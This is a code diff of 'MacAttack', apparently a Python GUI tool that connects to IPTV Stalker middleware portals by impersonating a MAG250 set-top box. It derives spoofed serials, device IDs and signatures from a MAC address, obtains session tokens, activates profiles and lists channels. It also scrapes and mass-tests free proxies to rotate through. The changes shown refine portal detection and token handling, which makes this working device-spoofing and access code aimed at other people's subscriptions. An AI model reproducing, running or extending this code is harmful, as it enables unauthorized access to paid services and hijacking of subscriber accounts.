@@ -1,8 +1,8 @@
-# todo
-# update stalker portal autodetect
-
+# TODO:
+# Clean up code, remove redundancy
 VERSION = "4.5.2"
 import semver
+import urllib.parse
 import webbrowser
 import base64
 import configparser
@@ -74,7 +74,9 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import quote, urlparse, urlunparse
 
 logging.basicConfig(level=logging.DEBUG)
-portaltype = "portal.php"
+portaltype = None
+player_portaltype = None
+
 
 @contextmanager
 def no_proxy_environment():
@@ -97,118 +99,203 @@ def no_proxy_environment():
             os.environ["https_proxy"] = original_https_proxy
 
 
-def get_token(session, url, mac_address, timeout=30):
-    handshake_url = (
-        f"{url}/{portaltype}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
-    )
+def get_token(session, url, mac, timeout=30):
+    global player_portaltype
+    player_portal_type_detected = None
+    player_portaltype = None
+
+    # Get and parse the IPTV link
+    parsed_url = urlparse(url)
+    parsed_path = parsed_url.path
+    logging.debug(parsed_path)
+    # Remove the c/ from the path
+    if parsed_path.endswith("c"):
+        parsed_path = parsed_path[:-1]
+    if parsed_path.endswith("c/"):
+        parsed_path = parsed_path[:-2]
+    logging.debug(parsed_path)
+    host = parsed_url.hostname
+    port = parsed_url.port or 80
+    base_url = f"http://{host}:{port}"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
+        "Accept-Encoding": "identity",
+        "Accept": "*/*",
+        "Connection": "close",
+    }
+
+    if not player_portal_type_detected:  # Check for type portal
+        version_url = f"{base_url}/c/version.js"
+        try:
+            response = requests.get(version_url, headers=headers)  # Add headers here
+            response.raise_for_status()  # Raise an exception for HTTP errors
+
+            # Extract the version using a regex
+            match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
+            if match:
+                portal_version = match.group(1)  # Extracted version string
+                logging.debug(version_url)
+                logging.info(
+                    f"\n\n\nPortal type: PORTAL version: {portal_version}\n\n\n"
+                )
+                player_portal_type_detected = "portal"
+                logging.info("Portal type selected: Portal")
+                player_portaltype = "portal.php"
+            else:
+                logging.debug("Version declaration not found in the file.")
+        except requests.RequestException as e:
+            logging.debug(f"Not type PORTAL: {e}")
+
+    if not player_portal_type_detected:  # check for type stalker_portal
+        version_url = f"{base_url}/stalker_portal/c/version.js"
+        try:
+            response = requests.get(version_url, headers=headers)  # Add headers here
+            response.raise_for_status()  # Raise an exception for HTTP errors
+
+            # Extract the version using a regex
+            match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
+            if match:
+                portal_version = match.group(1)  # Extracted version string
+                logging.debug(version_url)
+                logging.info(
+                    f"\n\n\nPortal type: STALKER_PORTAL version: {portal_version}\n\n\n"
+                )
+                player_portal_type_detected = "stalker_portal"
+                player_portaltype = "stalker_portal/server/load.php"
+            else:
+                logging.debug("Version declaration not found in the file.")
+        except requests.RequestException as e:
+            logging.debug(f"Not type STALKER_PORTAL")
+
+    if not player_portal_type_detected:  # Others failed, default to "portal"
+        player_portaltype = "portal.php"
+        portal_version = "5.3.1"
+        logging.debug(f"Not type STALKER_PORTAL")
+
+    base_url = f"http://{host}:{port}{parsed_path}"
+
+    # If both url and method co1antain "stalker_portal/" then remove it from the url
+    if "stalker_portal/" in base_url and "stalker_portal/" in player_portaltype:
+        base_url = base_url.replace("stalker_portal/", "")
+    logging.debug(base_url)
+    logging.debug(player_portaltype)
+
+    handshake_url = f"{url}/{player_portaltype}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
     try:
-        serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+        serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
         sn = serialnumber[0:13]
         device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
-        device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
-        hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
-        signature_string = f'{sn}{mac_address}'
-        signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+        device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
+        hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
+        snmac = f"{sn}{mac}"
+        sig = hashlib.sha256(snmac.encode()).hexdigest().upper()
         cookies = {
             "adid": hw_version_2,
             "debug": "1",
             "device_id2": device_id2,
             "device_id": device_id,
             "hw_version": "1.7-BD-00",
-            "mac": mac_address,
+            "mac": mac,
             "sn": sn,
             "stb_lang": "en",
             "timezone": "America/Los_Angeles",
         }
 
         headers = {
+            "Connection": "keep-alive",
             "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-            "Accept-Encoding": "gzip, deflate, zstd",
+            "Accept-Encoding": "identity",
             "Accept": "*/*",
-            "Cache-Control": "no-cache",
         }
 
         response = session.get(
             handshake_url, cookies=cookies, headers=headers, timeout=timeout
         )
-
+        logging.debug(response.headers)
+        logging.debug(response.text)
         response.raise_for_status()
         token = response.json().get("js", {}).get("token")
         if token:
-            
-            token_random = response.json().get("js", {}).get("random")  # Extract 'random' if present
 
-            
+            token_random = (
+                response.json().get("js", {}).get("random")
+            )  # Extract 'random' if present
+
             if token_random:
-                print("RANDOM FOUND")
+                logging.debug(f"RANDOM: {token_random}")
+                sig = hashlib.sha256(token_random.encode()).hexdigest().upper()
 
-                # Get profile first to activate portals that use a "random"
-                metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': token_random} 
+                metrics = {
+                    "mac": mac,
+                    "sn": sn,
+                    "type": "STB",
+                    "model": "MAG250",
+                    "uid": device_id,
+                    "random": token_random,
+                }
+                json_string = json.dumps(metrics)
+                encoded_string = urllib.parse.quote(json_string)
 
+                logging.debug(encoded_string)
                 session.headers.update(
                     {
-                        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
-                        'Accept-Encoding': 'gzip, deflate, zstd',
-                        'Accept': '*/*',
-                        'Connection': 'close',
-                        'Cache-Control': 'no-cache',
-                        'Authorization': f'Bearer {token}',  # token to headers
-                        'X-Random': '{token_random}',
-                        'Content-Type': 'application/x-www-form-urlencoded',
+                        "Connection": "keep-alive",
+                        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
+                        "Accept-Encoding": "identity",
+                        "Accept": "*/*",
+                        "Authorization": f"Bearer {token}",  # token to headers
+                        "X-Random": f"{token_random}",
                     }
                 )
 
                 session.cookies.update(
                     {
-                        'adid': hw_version_2,
-                        'debug': '1',
-                        'device_id2': device_id2,
-                        'device_id': device_id,
-                        'hw_version': '1.7-BD-00',
-                        'mac': mac_address,
-                        'sn': sn,
-                        'stb_lang': 'en',
-                        'timezone': 'America/Los_Angeles',
+                        "adid": hw_version_2,
+                        "debug": "1",
+                        "device_id2": device_id2,
+                        "device_id": device_id,
+                        "hw_version": "1.7-BD-00",
+                        "mac": mac,
+                        "sn": sn,
+                        "stb_lang": "en",
+                        "timezone": "America/Los_Angeles",
                     }
                 )
-                
-                
-                url1_a = f"{url}/{portaltype}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: 5.6.1; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&signature={signature}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={metrics}&hw_version_2={hw_version_2}&timestamp=1735503369&api_signature=262&prehash=0"
+
+                url1_a = f"{url}/{player_portaltype}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: {portal_version}; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={metrics}&hw_version_2={hw_version_2}&timestamp={round(time.time())}&api_sig=262&prehash=0"
+
                 # Activate the portal by getting the profile with the correct headers cookies and id's
-                res1_a = session.get(url1_a)            
-            
-            
-            
-            
-            
-            
-            
+                res1_a = session.get(url1_a)
+                logging.debug(res1_a.text)
+
+            else:
+                token_random = "0"
+
             logging.info(f"Token retrieved: {token}")
-            return token
+            return (token, token_random)
         else:
             logging.error("Token not found in handshake response.")
-            return None
+            return None, None
     except Exception as e:
         logging.error(f"Error getting token: {e}")
-        return None
+        logging.error(f"Error getting token: {e}")
+        return None, None
 
 
 class ProxyFetcher(QThread):
     update_proxy_output_signal = pyqtSignal(str)
     update_proxy_textbox_signal = pyqtSignal(str)
-    # Signal to update the UI with valid proxies
-    # valid_proxies_signal = pyqtSignal(list)
 
     def __init__(self):
         super().__init__()
-        self.proxy_fetching_speed = 100  # default fetching speed
-        self.proxy_testing_speed = 200  # default testing speed
+        self.proxy_fetching_speed = 100
+        self.proxy_testing_speed = 200
 
     def run(self):
         self.fetch_and_test_proxies()
 
     def fetch_and_test_proxies(self):
-        # Fetch proxies concurrently
+        # Fetch proxies
         all_proxies = self.fetch_proxies()
         if not all_proxies:
             self.update_proxy_output_signal.emit(
@@ -224,7 +311,7 @@ class ProxyFetcher(QThread):
         self.update_proxy_output_signal.emit(
             f"Duplicates removed: {duplicates_removed}\n"
         )
-        # Test proxies concurrently using the testing speed
+        # Test proxies
         working_proxies = []
         self.update_proxy_output_signal.emit("Testing proxies...")
         with ThreadPoolExecutor(max_workers=self.proxy_testing_speed) as executor:
@@ -258,7 +345,6 @@ class ProxyFetcher(QThread):
             "https://www.sslproxies.org/",
             "https://www.freeproxy.world/?type=http&anonymity=&country=&speed=&port=&page=1",
         ]
-        # Use the proxy fetching speed for concurrent fetching
         with ThreadPoolExecutor(max_workers=self.proxy_fetching_speed) as executor:
             futures = {
                 executor.submit(self.fetch_from_source, url): url for url in sources
@@ -311,24 +397,20 @@ class ProxyFetcher(QThread):
         return proxies
 
     def test_proxy(self, proxy):
-        # Checks if the returned JSON contains 'user': 'Evilvirus' and that the 'origin' matches the proxy IP.
+        # Check if the returned JSON contains 'user': 'Evilvirus' and that the 'origin' matches the proxy IP.
         url = "http://httpbin.org/anything?user=Evilvirus&application=MacAttack"
         proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-
-        # Extract the IP address from the proxy, ignoring the port
         proxy_ip = urlparse(f"http://{proxy}").hostname
 
         try:
             with no_proxy_environment():  # Bypass the environment proxy set in the video player tab
                 response = requests.get(url, proxies=proxies, timeout=30)
 
-                # Check for a successful response and if the returned JSON contains the user value
+                # Check for a successful response and get the values
                 if response.status_code == 200:
                     json_response = response.json()
                     user = json_response.get("args", {}).get("user")
                     origin = json_response.get("origin")
-
-                    # Log the proxy and origin values
                     logging.info(f"Proxy: {proxy}, Origin: {origin}")
 
                     # Check if the user is 'Evilvirus' and the origin matches the proxy IP (ignoring the port)
@@ -355,7 +437,7 @@ class ProxyTester(QThread):
         # Extract proxies from the text box
         proxies = self.proxy_textbox.toPlainText().splitlines()
 
-        # Ensure that we don't have empty proxies
+        # Ensure that we don't have empty lines
         proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
 
         if not proxies:
@@ -366,7 +448,7 @@ class ProxyTester(QThread):
 
         working_proxies = []
 
-        with ThreadPoolExecutor(max_workers=200) as executor:
+        with ThreadPoolExecutor(max_workers=100) as executor:
             future_to_proxy = {
                 executor.submit(self.test_proxy, proxy): proxy for proxy in proxies
             }
@@ -386,15 +468,10 @@ class ProxyTester(QThread):
 
         # Debugging: Log all proxies that passed the test
         logging.debug(f"Working proxies: {working_proxies}")
-        self.clear_textbox_signal.emit()  # Clear the textbox before starting
-        # Ensure no duplicates in the list of working proxies
+        self.clear_textbox_signal.emit()  # Clear the textbox
+        # Remove Dupes
         working_proxies = list(set(working_proxies))
-
-        # Debugging: Log the final list of working proxies
         logging.debug(f"Unique working proxies: {working_proxies}")
-
-        # Emit signal to clear the text box (done in the main thread)
-        self.clear_textbox_signal.emit()  # Clear the textbox before adding new proxies
 
         if working_proxies:
             # Emit the list of working proxies to the main thread
@@ -445,18 +522,20 @@ class RequestThread(QThread):
     def __init__(
         self,
         base_url,
-        mac_address,
+        mac,
         session,
         token,
+        token_random,
         category_type=None,
         category_id=None,
         num_threads=5,
     ):
         super().__init__()
         self.base_url = base_url
-        self.mac_address = mac_address
+        self.mac = mac
         self.session = session
         self.token = token
+        self.token_random = token_random
         self.category_type = category_type
         self.category_id = category_id
         self.num_threads = num_threads
@@ -466,22 +545,23 @@ class RequestThread(QThread):
             logging.debug("RequestThread started.")
             session = self.session
             url = self.base_url
-            mac_address = self.mac_address
+            mac = self.mac
             token = self.token
+            token_random = self.token_random
 
             # Define cookies and headers for subsequent requests, including the token
-            serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+            serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
             sn = serialnumber[0:13]
             device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
-            device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
-            hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+            device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
+            hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
             cookies = {
                 "adid": hw_version_2,
                 "debug": "1",
                 "device_id2": device_id2,
                 "device_id": device_id,
                 "hw_version": "1.7-BD-00",
-                "mac": mac_address,
+                "mac": mac,
                 "sn": sn,
                 "stb_lang": "en",
                 "timezone": "America/Los_Angeles",
@@ -489,47 +569,36 @@ class RequestThread(QThread):
             }
 
             headers = {
+                "Connection": "keep-alive",
                 "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) "
                 "AppleWebKit/533.3 (KHTML, like Gecko) "
                 "MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                 "Authorization": f"Bearer {token}",  # token to headers
             }
 
-            # Fetch profile and account info
-            try:
-                # First GET request: get_profile
-                profile_url = (
-                    f"{url}/{portaltype}?type=stb&action=get_profile&JsHttpRequest=1-xml"
-                )
-                logging.debug(f"Fetching profile from {profile_url}")
-                response_profile = session.get(
-                    profile_url, cookies=cookies, headers=headers, timeout=20
-                )
-                response_profile.raise_for_status()
-                profile_data = response_profile.json()
-                logging.debug(f"Profile data: {profile_data}")
-            except Exception as e:
-                logging.error(f"Error fetching profile: {e}")
-                profile_data = {}
+            if token_random:
+                logging.debug(f"RANDOM:{token_random}")
 
-            try:
-                # Second GET request: get_main_info
-                account_info_url = f"{url}/{portaltype}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
-                logging.debug(f"Fetching account info from {account_info_url}")
-                response_account_info = session.get(
-                    account_info_url,
-                    cookies=cookies,
-                    headers=headers,
-                    timeout=10,
-                    allow_redirects=False,
-                )
-                response_account_info.raise_for_status()
-                account_info_data = response_account_info.json()
-                logging.debug(f"Account info data: {account_info_data}")
-            except Exception as e:
-                logging.error(f"Error fetching account info: {e}")
+                headers = {
+                    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
+                    "Accept-Encoding": "identity",
+                    "Accept": "*/*",
+                    "Connection": "keep-alive",
+                    "Authorization": f"Bearer {token}",  # token to headers
+                    "X-Random": f"{token_random}",
+                }
 
-                account_info_data = {}
+                cookies = {
+                    "adid": hw_version_2,
+                    "debug": "1",
+                    "device_id2": device_id2,
+                    "device_id": device_id,
+                    "hw_version": "1.7-BD-00",
+                    "mac": mac,
+                    "sn": sn,
+                    "stb_lang": "en",
+                    "timezone": "America/Los_Angeles",
+                }
 
             if self.category_type and self.category_id:
                 # Fetch channels in a category
@@ -538,8 +607,9 @@ class RequestThread(QThread):
                 channels = self.get_channels(
                     session,
                     url,
-                    mac_address,
+                    mac,
                     token,
+                    token_random,
                     self.category_type,
                     self.category_id,
                     self.num_threads,
@@ -560,8 +630,9 @@ class RequestThread(QThread):
                             self.get_genres,
                             session,
                             url,
-                            mac_address,
+                            mac,
                             token,
+                            token_random,
                             cookies,
                             headers,
                         ): "Live",
@@ -569,8 +640,9 @@ class RequestThread(QThread):
                             self.get_vod_categories,
                             session,
                             url,
-                            mac_address,
+                            mac,
                             token,
+                            token_random,
                             cookies,
                             headers,
                         ): "Movies",
@@ -578,8 +650,9 @@ class RequestThread(QThread):
                             self.get_series_categories,
                             session,
                             url,
-                            mac_address,
+                            mac,
                             token,
+                            token_random,
                             cookies,
                             headers,
                         ): "Series",
@@ -620,11 +693,9 @@ class RequestThread(QThread):
             self.request_complete.emit({})  # Emit empty data in case of an error
             self.update_progress.emit(0)  # Reset progress on error
 
-    def get_genres(self, session, url, mac_address, token, cookies, headers):
+    def get_genres(self, session, url, mac, token, token_random, cookies, headers):
         try:
-            genres_url = (
-                f"{url}/{portaltype}?type=itv&action=get_genres&JsHttpRequest=1-xml"
-            )
+            genres_url = f"{url}/{player_portaltype}?type=itv&action=get_genres&JsHttpRequest=1-xml"
             response = session.get(
                 genres_url, cookies=cookies, headers=headers, timeout=10
             )
@@ -651,11 +722,11 @@ class RequestThread(QThread):
             self.request_complete.emit({})  # Emit empty data if no genres are found
             return []
 
-    def get_vod_categories(self, session, url, mac_address, token, cookies, headers):
+    def get_vod_categories(
+        self, session, url, mac, token, token_random, cookies, headers
+    ):
         try:
-            vod_url = (
-                f"{url}/{portaltype}?type=vod&action=get_categories&JsHttpRequest=1-xml"
-            )
+            vod_url = f"{url}/{player_portaltype}?type=vod&action=get_categories&JsHttpRequest=1-xml"
             response = session.get(
                 vod_url, cookies=cookies, headers=headers, timeout=10
             )
@@ -681,17 +752,20 @@ class RequestThread(QThread):
             logging.error(f"Error getting VOD categories: {e}")
             return []
 
-    def get_series_categories(self, session, url, mac_address, token, cookies, headers):
+    def get_series_categories(
+        self, session, url, mac, token, token_random, cookies, headers
+    ):
         try:
-            series_url = f"{url}/{portaltype}?type=series&action=get_categories&JsHttpRequest=1-xml"
+            series_url = f"{url}/{player_portaltype}?type=series&action=get_categories&JsHttpRequest=1-xml"
             response = session.get(
                 series_url, cookies=cookies, headers=headers, timeout=10
             )
+            logging.debug(response.text)
             response.raise_for_status()
             response_json = response.json()
             logging.debug(f"Series categories response: {response_json}")
             if not isinstance(response_json, dict) or "js" not in response_json:
-                logging.error("Unexpected response structure for series categories.")
+                logging.debug("Unexpected response structure for series categories.")
                 return []
 
             categories_data = response_json.get("js", [])
@@ -715,8 +789,9 @@ class RequestThread(QThread):
         self,
         session,
         url,
-        mac_address,
+        mac,
         token,
+        token_random,
         category_type,
         category_id,
         num_threads,
@@ -726,30 +801,35 @@ class RequestThread(QThread):
         try:
             channels = []
             # First, get total number of items
+            logging.debug("get_channels func started")
             page_number = 0
             total_items = None
             initial_url = ""
             if category_type == "IPTV":
-                initial_url = f"{url}/{portaltype}?type=itv&action=get_ordered_list&genre={category_id}&JsHttpRequest=1-xml&p=0"
+                initial_url = f"{url}/{player_portaltype}?type=itv&action=get_ordered_list&genre={category_id}&JsHttpRequest=1-xml&p=0"
+                logging.debug(initial_url)
             elif category_type == "VOD":
-                initial_url = f"{url}/{portaltype}?type=vod&action=get_ordered_list&category={category_id}&JsHttpRequest=1-xml&p=0"
+                initial_url = f"{url}/{player_portaltype}?type=vod&action=get_ordered_list&category={category_id}&JsHttpRequest=1-xml&p=0"
             elif category_type == "Series":
-                initial_url = f"{url}/{portaltype}?type=series&action=get_ordered_list&category={category_id}&p=0&JsHttpRequest=1-xml"
+                initial_url = f"{url}/{player_portaltype}?type=series&action=get_ordered_list&category={category_id}&p=0&JsHttpRequest=1-xml"
 
             response = session.get(
                 initial_url, cookies=cookies, headers=headers, timeout=10
             )
             response.raise_for_status()
             response_json = response.json()
-            total_items = response_json.get("js", {}).get("total_items", 0)
+            logging.debug(response.text)
+
+            total_items = int(response_json.get("js", {}).get("total_items", 0))
             items_per_page = len(response_json.get("js", {}).get("data", []))
-            total_pages = (total_items + items_per_page - 1) // items_per_page
 
-            logging.debug(
-                f"Total items: {total_items}, items per page: {items_per_page}, total pages: {total_pages}"
-            )
+            # Don't divide by zero
+            if items_per_page > 0:
+                total_pages = (total_items + items_per_page - 1) // items_per_page
+            else:
+                total_pages = 0
 
-            # first page data
+            # First page data
             channels_data = response_json.get("js", {}).get("data", [])
             for channel in channels_data:
                 channel["item_type"] = (
@@ -773,11 +853,11 @@ class RequestThread(QThread):
                 progress = 1  # Already fetched page 0
                 for p in page_numbers:
                     if category_type == "IPTV":
-                        channels_url = f"{url}/{portaltype}?type=itv&action=get_ordered_list&genre={category_id}&JsHttpRequest=1-xml&p={p}"
+                        channels_url = f"{url}/{player_portaltype}?type=itv&action=get_ordered_list&genre={category_id}&JsHttpRequest=1-xml&p={p}"
                     elif category_type == "VOD":
-                        channels_url = f"{url}/{portaltype}?type=vod&action=get_ordered_list&category={category_id}&JsHttpRequest=1-xml&p={p}"
+                        channels_url = f"{url}/{player_portaltype}?type=vod&action=get_ordered_list&category={category_id}&JsHttpRequest=1-xml&p={p}"
                     elif category_type == "Series":
-                        channels_url = f"{url}/{portaltype}?type=series&action=get_ordered_list&category={category_id}&p={p}&JsHttpRequest=1-xml"
+                        channels_url = f"{url}/{player_portaltype}?type=series&action=get_ordered_list&category={category_id}&p={p}&JsHttpRequest=1-xml"
                     else:
                         logging.error(f"Unknown category_type: {category_type}")
                         continue
@@ -878,10 +958,8 @@ class MacAttack(QMainWindow):
     update_mac_label_signal = pyqtSignal(str)
     update_output_text_signal = pyqtSignal(str)
     update_error_text_signal = pyqtSignal(str)
-    macattack_update_proxy_textbox_signal = pyqtSignal(
-        str
-    )  # macattack clean bad proxies
-    macattack_update_mac_count_signal = pyqtSignal()  # macattack remove custom mac
+    macattack_update_proxy_textbox_signal = pyqtSignal(str)
+    macattack_update_mac_count_signal = pyqtSignal()
 
     def __init__(self):
         super().__init__()
@@ -891,7 +969,6 @@ class MacAttack(QMainWindow):
         self.proxy_tester.update_proxy_textbox_signal.connect(self.update_proxy_textbox)
         self.mac_dict = deque()  # Initialize a deque to store MAC addresses
         self.proxy_error_counts = {}
-        # self.lock = Lock()  # For synchronizing file writes
         self.threads = []  # To track background threads
         # Initial VLC instance
         if getattr(sys, "frozen", False):
@@ -900,8 +977,8 @@ class MacAttack(QMainWindow):
             base_path = os.path.abspath(".")
         self.instance = vlc.Instance(
             [
-                f"--config={base_path}\\include\\vlcrc",  # config file holding the proxy info
-                "--repeat",  # keep connected if kicked off
+                f"--config={base_path}\\include\\vlcrc",  # Config file holding the proxy info
+                "--repeat",  # Keep connected if kicked off
                 "--no-xlib",  # Keep it quiet in X11 environments.
                 "--vout=directx",  # DirectX for the win (Windows specific).
                 "--no-plugins-cache",  # Cache is for the weak.
@@ -1002,23 +1079,19 @@ class MacAttack(QMainWindow):
         # Minimize button with a "-" label
         self.topbar_minimize_button = QPushButton("-")
         self.topbar_minimize_button.setFixedSize(20, 20)  # size adjustment
-        self.topbar_minimize_button.clicked.connect(
-            self.showMinimized
-        )  # Connect to minimize the app
+        self.topbar_minimize_button.clicked.connect(self.showMinimized)
         # Close button with "X"
         self.topbar_close_button = QPushButton("X")
         self.topbar_close_button.setFixedSize(20, 20)  # size adjustment
         self.topbar_close_button.clicked.connect(self.close)  # Connect to close the app
-        # buttons to the layout with appropriate alignment
         self.topbar_layout.addWidget(
             self.topbar_minimize_button, alignment=Qt.AlignTop | Qt.AlignRight
         )
         self.topbar_layout.addWidget(
             self.topbar_close_button, alignment=Qt.AlignTop | Qt.AlignRight
         )
-        # top bar layout to the main layout
         self.main_layout.addLayout(self.topbar_layout)
-        # Create the tabs content
+        # Tabs content
         self.mac_attack_frame = QWidget()
         self.build_mac_attack_gui(self.mac_attack_frame)
         self.tabs.addTab(self.mac_attack_frame, "Mac Attack")
@@ -1031,14 +1104,15 @@ class MacAttack(QMainWindow):
         self.Settings_frame = QWidget()
         self.build_Settings_gui(self.Settings_frame)
         self.tabs.addTab(self.Settings_frame, "Settings")
-        # Bottom bar layout
+        # Bottom bar
         self.bottombar_layout = QHBoxLayout()  # horizontal layout
         self.bottombar_layout.setContentsMargins(0, 30, 0, 0)
         self.bottombar_layout.setSpacing(0)
-        # bottom bar layout to the main layout
         self.main_layout.addLayout(self.bottombar_layout)
+        # Load saved settings
         self.load_settings()
-        # Connect the signals to their respective update methods
+
+        # Connect the signals to for the Bigmacattack func
         self.update_mac_label_signal.connect(self.update_mac_label)
         self.update_output_text_signal.connect(self.update_output_text)
         self.update_error_text_signal.connect(self.update_error_text)
@@ -1061,23 +1135,22 @@ class MacAttack(QMainWindow):
             logging.info(f"MAC address {mac} is already in the list.")
 
     def build_mac_videoPlayer_gui(self, parent):
-        # Central widget for the "Mac VideoPlayer" tab
+        # Mac VideoPlayer Tab
         central_widget = QWidget(self)
         parent.setLayout(QVBoxLayout())  # Set layout for the parent widget
         parent.layout().setContentsMargins(0, 0, 0, 0)
         parent.layout().setSpacing(0)
         parent.layout().addWidget(central_widget)
-        # Main layout with two sections: left (controls) and right (video + buttons)
+        # Main layout
         main_layout = QHBoxLayout(central_widget)
         main_layout.setContentsMargins(0, 0, 0, 0)
         main_layout.setSpacing(10)
-        # LEFT SECTION: Controls and other widgets
+        # LEFT SECTION
         self.left_layout = QVBoxLayout()
         self.left_layout.setContentsMargins(0, 0, 0, 0)
         self.left_layout.setSpacing(10)
-        self.left_layout.addSpacing(15)  # Adds space
-        # Hostname label and input horizontally aligned
-        self.hostname_layout = QHBoxLayout()  # horizontal layout
+        self.left_layout.addSpacing(15)
+        self.hostname_layout = QHBoxLayout()
         self.hostname_layout.setContentsMargins(0, 0, 0, 0)
         self.hostname_layout.setSpacing(0)
         self.hostname_label = QLabel("Host:")
@@ -1098,7 +1171,7 @@ class MacAttack(QMainWindow):
         self.playlist_layout.setSpacing(0)
         self.spacer = QSpacerItem(30, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
         self.playlist_layout.addItem(self.spacer)
-        # Proxy input layout
+        # Proxy input
         self.proxy_layout = QHBoxLayout()
         self.proxy_layout.setContentsMargins(0, 0, 0, 0)
         self.proxy_layout.setSpacing(0)
@@ -1112,20 +1185,8 @@ class MacAttack(QMainWindow):
         self.playlist_layout.addWidget(self.get_playlist_button)
         self.get_playlist_button.clicked.connect(self.get_playlist)
         self.left_layout.addLayout(self.playlist_layout)
-        # I got smarter, and put it on video load
-        # Connect host and proxy input change to proxy update
         self.proxy_input.textChanged.connect(self.update_proxy)
-        # self.hostname_input.textChanged.connect(self.update_proxy)
-        """ TEMPORARILY Disabled
-        # the search input field above the tabs
-        self.search_input = QLineEdit(self)
-        self.search_input.setPlaceholderText("Filter Playlist...")
-        self.search_input.textChanged.connect(
-            self.filter_playlist
-        )  # Connect to the filtering function        
-        self.left_layout.addWidget(self.search_input, alignment=Qt.AlignLeft)
-        """
-        # QTabWidget (for "Live", "Movies", "Series")
+        # Playlist Tabs
         self.tab_widget = QTabWidget()
         self.left_layout.addWidget(self.tab_widget)
         # Dictionary to hold tab data
@@ -1143,7 +1204,7 @@ class MacAttack(QMainWindow):
             # Connect double-click signal
             playlist_view.doubleClicked.connect(self.on_playlist_selection_changed)
 
-            # the tab to the tab widget
+            # Add the Tabs
             self.tab_widget.addTab(tab, tab_name)
 
             # Store tab data
@@ -1158,7 +1219,7 @@ class MacAttack(QMainWindow):
                 "current_series_info": [],
                 "current_view": "categories",
             }
-        # Progress bar at the bottom
+        # Progress bar
         self.progress_layout = QHBoxLayout()
         self.progress_layout.setContentsMargins(0, 0, 0, 0)
         self.progress_layout.setSpacing(0)
@@ -1166,7 +1227,7 @@ class MacAttack(QMainWindow):
         self.progress_bar.setValue(0)
         self.progress_layout.addWidget(self.progress_bar)
         self.left_layout.addLayout(self.progress_layout)
-        # Create "ERROR" label and hide it initially
+        # Error Label
         self.error_label = QLabel("ERROR: Error message label")
         self.error_label.setStyleSheet(
             "color: red; font-size: 10pt; margin-bottom: 15px;"
@@ -1177,7 +1238,7 @@ class MacAttack(QMainWindow):
         self.left_widget.setLayout(self.left_layout)
         self.left_widget.setFixedWidth(240)
         main_layout.addWidget(self.left_widget)
-        # RIGHT SECTION: Video area and controls
+        # RIGHT SECTION: Video area
         right_layout = QVBoxLayout()
         right_layout.setContentsMargins(0, 0, 0, 0)
         right_layout.setSpacing(0)
@@ -1203,11 +1264,10 @@ class MacAttack(QMainWindow):
         self.videoPlayer.set_media(self.instance.media_new(video_path))
         logging.info(video_path)
         self.startplay = 1  # play the video when switched to the video tab
-        # self.videoPlayer.play()
         # Disable mouse and key input for video
         self.videoPlayer.video_set_mouse_input(False)
         self.videoPlayer.video_set_key_input(False)
-        # progress animation
+        # Progress Animation
         self.progress_animation = QPropertyAnimation(self.progress_bar, b"value")
         self.progress_animation.setDuration(1000)
         self.progress_animation.setEasingCurve(QEasingCurve.Linear)
@@ -1219,10 +1279,10 @@ class MacAttack(QMainWindow):
         self.error_label.setVisible(False)
         self.set_progress(0)  # Reset the progress bar to 0 at the start
         hostname_input = self.hostname_input.text().strip()
-        mac_address = self.mac_input.text().strip().upper()
+        mac = self.mac_input.text().strip().upper()
         num_threads = 5
 
